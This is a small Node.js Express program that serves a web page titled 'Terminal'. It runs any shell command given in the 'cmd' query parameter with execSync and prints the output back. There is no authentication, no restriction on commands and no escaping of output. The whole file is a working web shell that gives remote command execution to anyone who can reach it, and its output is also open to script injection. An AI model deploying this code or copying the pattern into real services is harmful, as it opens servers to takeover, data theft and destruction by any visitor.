const express = require('express');
const { execSync } = require('child_process');
const app = express();

app.get('/', (req, res) => {
  const cmd = req.query.cmd;
  let output = '';
  if (cmd) {
    try { output = execSync(cmd, { timeout: 8000 }).toString(); }
    catch(e) { output = e.stderr ? e.stderr.toString() : e.message; }
  }
  res.send(`<html><head><title>Terminal</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;padding:10px">
<form action="/" method="GET">
<input name="cmd" value="" style="background:#000;color:#0f0;border:1px solid #0f0;padding:8px;width:85%;font-family:monospace;font-size:14px" autofocus autocomplete="off" autocorrect="off" autocapitalize="off"/>
<input type="submit" value="Run" style="background:#0f0;color:#000;padding:8px;border:none;font-weight:bold"/>
</form>
<pre style="margin-top:10px">${cmd ? '$ '+cmd+'\n'+output : 'Ready...'}</pre>
</body></html>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT);
